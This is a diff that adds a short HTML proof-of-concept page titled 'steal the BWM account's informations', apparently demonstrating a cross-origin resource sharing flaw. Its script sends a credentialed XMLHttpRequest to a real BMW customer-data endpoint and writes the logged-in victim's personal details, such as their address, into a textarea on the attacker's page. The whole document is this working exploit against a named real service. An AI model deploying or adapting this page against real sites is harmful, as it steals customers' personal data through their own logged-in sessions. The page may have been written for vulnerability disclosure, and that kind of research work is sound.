@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="referrer" content="never">
+<script src=/jquery-3.4.1.min.js></script>
+</head>
+<title>steal the BWM account's informations</title>
+<div>
+<div text="steal customer's personal informaiton">
+steal customer's personal address
+<textarea id="customer" style="width: 500px; height: 800px;"></textarea>
+</div>
+</br>
+</br>
+</br>
+
+<script>
+
+     var xmlhttp1 = new XMLHttpRequest()
+     xmlhttp1.onreadystatechange=function()
+	{
+		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
+		{
+			document.getElementById("customer").innerHTML = xmlhttp1.responseText;
+			console.log("Success");
+		}
+	}
+    	
+	xmlhttp1.open("GET","https://customer.bmwgroup.com/gcdm/protected/bmwdigital/DE-de/customers?getBuPa=true",true);
+	xmlhttp1.withCredentials = true;
+	xmlhttp1.send();
+  </script>
+  </html>
